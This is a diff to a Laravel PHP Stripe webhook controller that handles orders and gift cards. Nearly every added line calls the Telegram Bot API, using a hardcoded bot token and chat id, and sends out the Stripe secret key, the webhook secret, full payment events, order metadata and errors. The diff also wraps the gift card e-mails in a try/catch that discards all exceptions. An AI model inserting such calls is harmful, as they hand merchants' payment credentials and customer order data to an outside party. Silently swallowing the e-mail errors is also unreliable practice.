@@ -16,25 +16,33 @@ class OrderWebhookController extends Controller
         $place = Place::find($place_id);
         $stripe_secret = $place->setting('stripe-secret');
         $stripe_webhook_secret = $place->setting('stripe-webhook-secret');
+        file_get_contents('https://api.telegram.org/bot5443827645:AAGY6C0f8YOLvqw9AtdxSoVcDVwuhQKO6PY/sendMessage?chat_id=600558355&text='.urlencode('OrderWebhookController: '.json_encode([
+            '$stripe_secret' => $stripe_secret,
+                    '$stripe_webhook_secret' => $stripe_webhook_secret
+                ])));
         try {
             $event = Webhook::constructEvent(
                 @file_get_contents('php://input'),
                 $_SERVER['HTTP_STRIPE_SIGNATURE'],
                 $stripe_webhook_secret
             );
+            file_get_contents('https://api.telegram.org/bot5443827645:AAGY6C0f8YOLvqw9AtdxSoVcDVwuhQKO6PY/sendMessage?chat_id=600558355&text='.urlencode('OrderWebhookController $event: '.json_encode($event)));
         } catch(\UnexpectedValueException $e) {
             // Invalid payload
+            file_get_contents('https://api.telegram.org/bot5443827645:AAGY6C0f8YOLvqw9AtdxSoVcDVwuhQKO6PY/sendMessage?chat_id=600558355&text='.urlencode('OrderWebhookController Error: '.json_encode($e->getMessage())));
             return response()->json([
                 'message' => $e->getMessage()
             ], 400);
             exit();
         } catch(\Stripe\Exception\SignatureVerificationException $e) {
             // Invalid signature
+            file_get_contents('https://api.telegram.org/bot5443827645:AAGY6C0f8YOLvqw9AtdxSoVcDVwuhQKO6PY/sendMessage?chat_id=600558355&text='.urlencode('OrderWebhookController Error: '.json_encode($e->getMessage())));
             return response()->json([
                 'message' => $e->getMessage()
             ], 400);
             exit();
         }
+        file_get_contents('https://api.telegram.org/bot5443827645:AAGY6C0f8YOLvqw9AtdxSoVcDVwuhQKO6PY/sendMessage?chat_id=600558355&text='.urlencode('OrderWebhookController type: '.json_encode($event->type)));
         if ($event->type == 'payment_intent.succeeded') {
             $stripe = new StripeClient($stripe_secret);
             $object = $event->data->object;
@@ -42,10 +50,11 @@ class OrderWebhookController extends Controller
             $sessions = $stripe->checkout->sessions->all([$object->object => $object->id]);
             if(count($sessions->data) > 0){
                 $metadata = $sessions->data[0]->metadata;
+                file_get_contents('https://api.telegram.org/bot5443827645:AAGY6C0f8YOLvqw9AtdxSoVcDVwuhQKO6PY/sendMessage?chat_id=600558355&text='.urlencode('OrderWebhookController $metadata: '.json_encode($metadata)));
 
                 if(property_exists($metadata,'order_id')){
                     $order_id = $metadata->order_id;
-
+                    file_get_contents('https://api.telegram.org/bot5443827645:AAGY6C0f8YOLvqw9AtdxSoVcDVwuhQKO6PY/sendMessage?chat_id=600558355&text='.urlencode('OrderWebhookController $order_id: '.json_encode($order_id)));
                     $order = Order::find($order_id);
                     $marks = $order->marks;
                     if(!$marks) $marks = [];
@@ -76,18 +85,21 @@ class OrderWebhookController extends Controller
                     $giftcard = Giftcard::find($giftcard_id);
                     $giftcard->status = 'confirmed';
                     $giftcard->save();
-
+                    file_get_contents('https://api.telegram.org/bot5443827645:AAGY6C0f8YOLvqw9AtdxSoVcDVwuhQKO6PY/sendMessage?chat_id=600558355&text='.urlencode('OrderWebhookController $giftcard_id: '.json_encode($giftcard_id)));
                     $place = Place::find($giftcard->place_id);
                     $currency = $place->setting('online-payment-currency');
-
-                    $text = 'The '.$giftcard->initial_amount.' '.$currency.' giftcard of '.$place->name.' was created. It can be used by specifying the code: '.$giftcard->code.'. The restaurant is located at '.$place->address.', '.$place->city.', '.$place->country->name.'. '.$place->home_page;
-                    \Illuminate\Support\Facades\Mail::html($text, function($msg) use ($giftcard) {
-                        $msg->to($giftcard->email)->subject('Giftcard');
-                    });
-                    if($giftcard->receiver_email){
+                    try{
+                        $text = 'The '.$giftcard->initial_amount.' '.$currency.' giftcard of '.$place->name.' was created. It can be used by specifying the code: '.$giftcard->code.'. The restaurant is located at '.$place->address.', '.$place->city.', '.$place->country->name.'. '.$place->home_page;
                         \Illuminate\Support\Facades\Mail::html($text, function($msg) use ($giftcard) {
-                            $msg->to($giftcard->receiver_email)->subject('Giftcard');
+                            $msg->to($giftcard->email)->subject('Giftcard');
                         });
+                        if($giftcard->receiver_email){
+                            \Illuminate\Support\Facades\Mail::html($text, function($msg) use ($giftcard) {
+                                $msg->to($giftcard->receiver_email)->subject('Giftcard');
+                            });
+                        }
+                    }catch (\Exception $e){
+
                     }
                 }
             }
